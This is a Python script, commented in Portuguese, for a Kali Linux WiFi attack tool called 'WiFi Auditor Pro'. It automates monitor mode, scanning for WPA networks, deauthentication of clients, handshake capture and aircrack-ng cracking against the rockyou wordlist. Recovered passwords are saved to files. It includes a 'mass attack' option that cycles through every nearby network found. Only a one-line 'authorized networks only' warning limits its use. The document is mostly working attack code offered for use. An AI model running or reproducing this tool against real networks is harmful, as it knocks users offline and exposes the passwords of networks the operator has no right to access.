#!/usr/bin/env python3
# WiFi Auditor Pro v8.1 – SALVA EM /home/kali/wifi_auditor_pro
# Desenvolvido por Leonardo de Moura Fuseti

import os
import sys
import subprocess
import time
import shutil
import re
from datetime import datetime
import signal

# === PASTA DE SAÍDA ===
OUTPUT_DIR = "/home/kali/wifi_auditor_pro"
os.makedirs(OUTPUT_DIR, exist_ok=True)  # Cria a pasta se não existir

# === CORES ===
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# === LIMPAR TELA ===
def clear():
    os.system('clear')

# === CABEÇALHO AUTORAL ===
def print_header():
    clear()
    print(f"""
{Colors.HEADER}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════════════════════╗
║             Ferramenta de Pentest Automatizado com Interface                      ║
║                      Interativa descoberta de senha                               ║
║                      Interface em terminal para wifi                              ║
╚═══════════════════════════════════════════════════════════════════════════════════╝
{Colors.ENDC}
{Colors.OKGREEN}        Desenvolvido por Leonardo de Moura Fuseti{Colors.ENDC}
{Colors.OKBLUE}        Copyright © 2025 - Todos os Direitos Reservados{Colors.ENDC}
    """)
    input(f"\n{Colors.OKCYAN}   Pressione ENTER para continuar...{Colors.ENDC}")

# === BANNER ===
def print_banner():
    clear()
    print(f"""
{Colors.HEADER}{Colors.BOLD}
  ╔══════════════════════════════════════════════════════════════════════════╗
  ║                              WiFi Auditor Pro v8.1                       ║
  ║            Handshake • PMKID • Bully • Reaver • Pixie-Dust • MASSA       ║
  ╚══════════════════════════════════════════════════════════════════════════╝
{Colors.ENDC}
{Colors.OKGREEN}   SALVA EM: {OUTPUT_DIR}{Colors.ENDC}
{Colors.WARNING}   Use apenas em redes autorizadas!{Colors.ENDC}
    """)

# === ROOT ===
def check_root():
    if os.geteuid() != 0:
        print(f"{Colors.FAIL}[!] ROOT necessário! Use: sudo python3 {sys.argv[0]}{Colors.ENDC}")
        sys.exit(1)

# === LIMPEZA ===
def cleanup(signum=None, frame=None):
    print(f"\n{Colors.WARNING}[*] Limpando...{Colors.ENDC}")
    os.system("airmon-ng stop wlan0mon mon0 >/dev/null 2>&1")
    os.system("pkill -f airodump-ng >/dev/null 2>&1")
    os.system("pkill -f aireplay-ng >/dev/null 2>&1")
    os.system("pkill -f hcxdumptool >/dev/null 2>&1")
    os.system("pkill -f bully >/dev/null 2>&1")
    os.system("pkill -f reaver >/dev/null 2>&1")
    if signum is not None:
        sys.exit(0)

signal.signal(signal.SIGINT, cleanup)

# === INTERFACE ===
def get_interfaces():
    try:
        result = subprocess.run(['iwconfig'], capture_output=True, text=True, check=True)
        return [line.split()[0] for line in result.stdout.splitlines() if re.match(r'^(wlan|wlp)', line)]
    except:
        return []

def menu_interface():
    clear()
    print(f"{Colors.HEADER}{Colors.BOLD}╔═════════════════════════════════════════════════════╗{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}║                 WiFi Auditor Pro v8.1               ║{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}╔═════════════════ CONFIGURAR INTERFACE ══════════════╗{Colors.ENDC}")
    ifaces = get_interfaces()
    if not ifaces:
        print(f"{Colors.FAIL}   [!] Nenhuma interface wireless!{Colors.ENDC}")
        input(f"\n{Colors.OKCYAN}   ENTER para voltar...{Colors.ENDC}")
        return None
    print(f"{Colors.OKBLUE}   Interfaces:{Colors.ENDC}")
    for i, iface in enumerate(ifaces):
        print(f"   {i+1}. {iface}")
    while True:
        try:
            c = int(input(f"\n{Colors.OKCYAN}   Escolha: {Colors.ENDC}")) - 1
            mon = start_monitor(ifaces[c])
            if mon:
                input(f"\n{Colors.OKGREEN}   Monitor: {mon} → ENTER{Colors.ENDC}")
                return mon
        except:
            print(f"{Colors.FAIL}   Inválido!{Colors.ENDC}")

def start_monitor(iface):
    print(f"{Colors.OKCYAN}   Parando processos...{Colors.ENDC}")
    os.system("airmon-ng check kill >/dev/null 2>&1")
    print(f"{Colors.OKCYAN}   Iniciando monitor em {iface}...{Colors.ENDC}")
    result = subprocess.run(['airmon-ng', 'start', iface], capture_output=True, text=True)
    mon_iface = None
    for line in result.stdout.splitlines():
        if 'monitor mode vif enabled' in line:
            mon_iface = line.split('[')[1].split(']')[0]
            break
    if not mon_iface:
        time.sleep(3)
        result = subprocess.run(['iwconfig'], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if 'Mode:Monitor' in line:
                mon_iface = line.split()[0]
                break
    if not mon_iface:
        print(f"{Colors.FAIL}   Falha ao ativar monitor!{Colors.ENDC}")
        return None
    print(f"{Colors.OKGREEN}   Monitor: {mon_iface}{Colors.ENDC}")
    return mon_iface

# === WORDLIST ===
def menu_wordlist():
    clear()
    print(f"{Colors.HEADER}{Colors.BOLD}╔═══════════════════════════════════════════════════════╗{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}║                 WiFi Auditor Pro v8.1                 ║{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}╔══════════════════ ESCOLHER WORDLIST ══════════════════╗{Colors.ENDC}")
    default = "/usr/share/wordlists/rockyou.txt"
    print("   1. Rockyou (padrão)")
    print("   2. Personalizado")
    print("   3. Baixar Rockyou")
    print("   0. Voltar")
    c = input(f"\n{Colors.OKCYAN}   Escolha: {Colors.ENDC}")
    if c == '1':
        if os.path.exists(default):
            return default
        if os.path.exists(default + ".gz"):
            os.system(f"gunzip -k {default}.gz")
            return default if os.path.exists(default) else None
        print(f"{Colors.FAIL}   Rockyou não encontrado!{Colors.ENDC}")
    elif c == '2':
        p = input(f"{Colors.OKCYAN}   Caminho: {Colors.ENDC}").strip()
        return p if os.path.exists(p) else None
    elif c == '3':
        p = "/tmp/rockyou.txt"
        print(f"{Colors.WARNING}   Baixando...{Colors.ENDC}")
        os.system(f"wget -q --show-progress -O {p} https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt")
        return p if os.path.exists(p) else None
    return None

# === SCAN ===
def scan_networks(mon_iface):
    clear()
    print(f"{Colors.HEADER}{Colors.BOLD}╔════════════════════════════════════════════════════════╗{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}║                 WiFi Auditor Pro v8.1                  ║{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}╔═══════════════════ ESCANEANDO REDES ═══════════════════╗{Colors.ENDC}")
    print(f"{Colors.OKCYAN}   Escaneando por 50s...{Colors.ENDC}")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    prefix = f"/tmp/scan_{timestamp}"
    cmd = ['airodump-ng', mon_iface, '-w', prefix, '--output-format', 'csv', '--write-interval', '1']
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(50)
    except KeyboardInterrupt:
        pass
    proc.terminate()
    try:
        proc.wait(timeout=3)
    except:
        proc.kill()
    time.sleep(3)

    aps = []
    csv_file = f"{prefix}-01.csv"
    if os.path.exists(csv_file):
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            in_ap = False
            for line in lines:
                line = line.strip()
                if line.startswith('BSSID'):
                    in_ap = True
                    continue
                if line.startswith('Station MAC'):
                    break
                if in_ap and ',' in line:
                    parts = [p.strip() for p in line.split(',', 14)]
                    if len(parts) < 14: continue
                    bssid = parts[0]
                    power = parts[8] if parts[8] else '-1'
                    enc = parts[5]
                    essid = parts[13] if len(parts) > 13 else ''
                    chan = parts[3]
                    if essid and essid != '<length: 0>' and bssid != '00:00:00:00:00:00':
                        if enc in ['WPA', 'WPA2', 'WPA2/PSK', 'WPA/WPA2']:
                            try:
                                if int(power) > -95:
                                    aps.append({'bssid': bssid, 'essid': essid[:25], 'power': power, 'chan': chan, 'enc': enc})
                            except: pass
        except: pass
        finally:
            if os.path.exists(csv_file):
                os.remove(csv_file)
    return sorted(aps, key=lambda x: int(x['power']), reverse=True)[:15]

# === HANDSHAKE COM PROGRESSO + SALVAR EM /home/kali/wifi_auditor_pro ===
def capture_handshake(ap, mon_iface, wordlist):
    clear()
    print(f"{Colors.HEADER}{Colors.BOLD}╔════════════════════════════════════════════════════════╗{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}║                 WiFi Auditor Pro v8.1                  ║{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}╔══════════════════ ATAQUE HANDSHAKE ════════════════════╗{Colors.ENDC}")
    print(f"   Alvo: {Colors.OKGREEN}{ap['essid']}{Colors.ENDC} | {ap['power']} dBm")
    print(f"   BSSID: {ap['bssid']} | CH {ap['chan']}")

    prefix = f"/tmp/hs_{int(time.time())}"
    os.system(f"iwconfig {mon_iface} channel {ap['chan']} 2>/dev/null")
    deauth = subprocess.Popen(['aireplay-ng', '--deauth', '7', '-a', ap['bssid'], mon_iface],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    cap = subprocess.Popen(['airodump-ng', '-c', ap['chan'], '--bssid', ap['bssid'], '-w', prefix, mon_iface],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"{Colors.OKCYAN}   Capturando handshake...{Colors.ENDC}")
    handshake = False
    for _ in range(20):
        time.sleep(3)
        cap_file = f"{prefix}-01.cap"
        if os.path.exists(cap_file) and os.path.getsize(cap_file) > 500:
            out = subprocess.check_output(['aircrack-ng', cap_file], text=True, stderr=subprocess.DEVNULL)
            if '1 handshake' in out:
                print(f"{Colors.OKGREEN}   HANDSHAKE CAPTURADO!{Colors.ENDC}")
                handshake = True
                break
    deauth.terminate()
    cap.terminate()
    time.sleep(2)

    if handshake and os.path.exists(f"{prefix}-01.cap"):
        # === MOVER .cap para pasta final ===
        final_cap = os.path.join(OUTPUT_DIR, f"{ap['essid']}_{ap['bssid'][:8]}.cap")
        shutil.move(f"{prefix}-01.cap", final_cap)

        # === QUEBRANDO SENHA COM PROGRESSO ===
        print(f"{Colors.OKCYAN}   Quebrando senha...{Colors.ENDC}")
        keyfile = f"/tmp/key_{int(time.time())}"
        start_time = time.time()

        proc = subprocess.Popen(
            ['aircrack-ng', '-w', wordlist, '-b', ap['bssid'], final_cap, '-l', keyfile],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
        )

        pw = None
        tried = 0
        for line in proc.stdout:
            line = line.strip()
            print(f"   {Colors.OKBLUE}→ {line}{Colors.ENDC}")
            if 'key' in line.lower() and 'tested' in line.lower():
                match = re.search(r'(\d+) keys? tested', line)
                if match:
                    tried = int(match.group(1))
            if 'KEY FOUND!' in line:
                pw_match = re.search(r'\[ (.*?) \]', line)
                if pw_match:
                    pw = pw_match.group(1)
                break

        proc.wait()
        end_time = time.time()
        duration = int(end_time - start_time)

        # === SALVAR SENHA COM NOME PERSONALIZADO ===
        if pw:
            print(f"\n{Colors.OKGREEN}   SENHA ENCONTRADA: {pw}{Colors.ENDC}")
            print(f"{Colors.OKGREEN}   Tempo: {duration}s | {tried:,} senhas testadas{Colors.ENDC}")

            while True:
                filename = input(f"\n{Colors.OKCYAN}   Nome do arquivo .txt (sem .txt): {Colors.ENDC}").strip()
                if not filename:
                    print(f"{Colors.WARNING}   Nome inválido!{Colors.ENDC}")
                    continue
                if re.search(r'[<>:"/\\|?*]', filename):
                    print(f"{Colors.WARNING}   Caracteres inválidos!{Colors.ENDC}")
                    continue
                break

            save_path = os.path.join(OUTPUT_DIR, f"{filename}.txt")
            with open(save_path, "w") as f:
                f.write(f"REDE: {ap['essid']}\n")
                f.write(f"BSSID: {ap['bssid']}\n")
                f.write(f"SENHA: {pw}\n")
                f.write(f"TEMPO: {duration}s\n")
                f.write(f"TESTADAS: {tried:,}\n")
                f.write(f"DATA: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            print(f"{Colors.OKGREEN}   Salvo em: {save_path}{Colors.ENDC}")
        else:
            print(f"\n{Colors.WARNING}   Senha não encontrada.{Colors.ENDC}")
            print(f"{Colors.WARNING}   Tempo: {duration}s | {tried:,} senhas testadas{Colors.ENDC}")

        # === RELATÓRIO GERAL ===
        rel = os.path.join(OUTPUT_DIR, "relatorio.txt")
        with open(rel, "a") as r:
            r.write(f"[{datetime.now()}] HANDSHAKE | {ap['essid']} | {ap['bssid']} | {pw or 'N/A'} | {duration}s | {tried} testadas | {filename}.txt\n")

    else:
        print(f"{Colors.WARNING}   Handshake não capturado.{Colors.ENDC}")
    input(f"\n{Colors.OKCYAN}   ENTER para continuar...{Colors.ENDC}")

# === ATAQUE EM MASSA ===
def mass_attack(aps, mon_iface, wordlist):
    clear()
    print(f"{Colors.HEADER}{Colors.BOLD}╔════════════════════════════════════════════════════════╗{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}║               WiFi Auditor Pro v8.1                    ║{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}╔════════════════════ ATAQUE EM MASSA ═══════════════════╗{Colors.ENDC}")
    print(f"   {Colors.OKGREEN}{len(aps)} redes serão atacadas{Colors.ENDC}")
    input(f"\n{Colors.OKCYAN}   ENTER para começar...{Colors.ENDC}")

    for i, ap in enumerate(aps):
        clear()
        print(f"{Colors.HEADER}{Colors.BOLD}╔══════════════ {i+1}/{len(aps)}: {ap['essid']} ══════════════╗{Colors.ENDC}")
        capture_handshake(ap, mon_iface, wordlist)
    
    clear()
    print(f"{Colors.OKGREEN}╔════════════════════════════════════════════════════════╗{Colors.ENDC}")
    print(f"{Colors.OKGREEN}║               WiFi Auditor Pro v8.1                    ║{Colors.ENDC}")
    print(f"{Colors.OKGREEN}║                 ATAQUE CONCLUÍDO!                      ║{Colors.ENDC}")
    print(f"{Colors.OKGREEN}╚════════════════════════════════════════════════════════╝{Colors.ENDC}")
    input(f"\n{Colors.OKCYAN}   ENTER...{Colors.ENDC}")

# === MENU ATAQUES ===
def menu_attacks(mon_iface, wordlist):
    while True:
        clear()
        print(f"{Colors.HEADER}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════════╗{Colors.ENDC}")
        print(f"{Colors.HEADER}{Colors.BOLD}║                              WiFi Auditor Pro v8.1                        ║{Colors.ENDC}")
        print(f"{Colors.HEADER}{Colors.BOLD}╔════════════════════════════════ MENU DE ATAQUES ══════════════════════════╗{Colors.ENDC}")
        print("   1. Scan + Handshake (WPA) (RECOMENDADO)")
        print("   2. PMKID (hcxdumptool + hashcat)")
        print("   3. Bully (WPS PIN)")
        print("   4. Reaver (WPS PIN)")
        print("   5. Pixie-Dust (WPS offline)")
        print("   0. Voltar")
        c = input(f"\n{Colors.OKCYAN}   Escolha: {Colors.ENDC}")

        if c == '1':
            aps = scan_networks(mon_iface)
            if not aps:
                input(f"{Colors.WARNING}   Nenhuma WPA → ENTER{Colors.ENDC}")
                continue
            print(f"{Colors.OKGREEN}   {len(aps)} redes WPA:{Colors.ENDC}")
            for i, ap in enumerate(aps):
                print(f"   {i+1}. {ap['essid']:<20} | {ap['power']} dBm")
            print(f"   {Colors.OKBLUE}0. ATACAR TODAS (MASSA){Colors.ENDC}")
            try:
                t = input(f"\n{Colors.OKCYAN}   Alvo (1-{len(aps)}, 0=massa): {Colors.ENDC}").strip()
                if t == '0':
                    mass_attack(aps, mon_iface, wordlist)
                else:
                    t = int(t) - 1
                    if 0 <= t < len(aps):
                        capture_handshake(aps[t], mon_iface, wordlist)
            except:
                print(f"{Colors.FAIL}   Inválido!{Colors.ENDC}")
                input(f"\n{Colors.OKCYAN}   ENTER...{Colors.ENDC}")
        elif c == '0':
            break

# === RELATÓRIOS ===
def menu_reports():
    clear()
    print(f"{Colors.HEADER}{Colors.BOLD}╔══════════════════════════════════════════════════════╗{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}║                 WiFi Auditor Pro v8.1                ║{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}╔═════════════════════ RELATÓRIOS ═════════════════════╗{Colors.ENDC}")
    rel = os.path.join(OUTPUT_DIR, "relatorio.txt")
    if os.path.exists(rel):
        print(open(rel).read())
    else:
        print(f"{Colors.WARNING}   Nenhum relatório.{Colors.ENDC}")
    input(f"\n{Colors.OKCYAN}   ENTER...{Colors.ENDC}")

# === MENU PRINCIPAL ===
def main():
    check_root()
    print_header()
    print_banner()
    signal.signal(signal.SIGINT, cleanup)

    mon_iface = None
    wordlist = None

    while True:
        clear()
        print(f"{Colors.HEADER}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════╗{Colors.ENDC}")
        print(f"{Colors.HEADER}{Colors.BOLD}║                         WiFi Auditor Pro v8.1                         ║{Colors.ENDC}")
        print(f"{Colors.HEADER}{Colors.BOLD}║                             MENU PRINCIPAL                            ║{Colors.ENDC}")
        print(f"{Colors.HEADER}{Colors.BOLD}╚═══════════════════════════════════════════════════════════════════════╝{Colors.ENDC}")
        print(f"   1. Configurar Interface wlan0")
        print(f"   2. Configurar Interface wlan0mon")
        print(f"   3. Escolher Wordlist")
        print(f"   4. Iniciar Ataques")
        print(f"   5. Ver Relatórios")
        print(f"   ")
        print(f"   ")
        print(f"   0. Sair")
        c = input(f"\n{Colors.OKBLUE}   Opção: {Colors.ENDC}")

        if c == '1':
            mon_iface = menu_interface()
        elif c == '2':
                mon_iface = menu_interface()
        elif c == '3':
            wl = menu_wordlist()
            if wl:
                wordlist = wl
                print(f"{Colors.OKGREEN}   Wordlist: {wordlist}{Colors.ENDC}")
                input(f"\n{Colors.OKCYAN}   ENTER...{Colors.ENDC}")
        elif c == '4':
            if not mon_iface or not wordlist:
                print(f"{Colors.FAIL}   Configure interface e wordlist!{Colors.ENDC}")
                input(f"\n{Colors.OKCYAN}   ENTER...{Colors.ENDC}")
                continue
            menu_attacks(mon_iface, wordlist)
        elif c == '5':
            menu_reports()
        elif c in ['0', 'q']:
            cleanup()
            break

if __name__ == "__main__":
    main()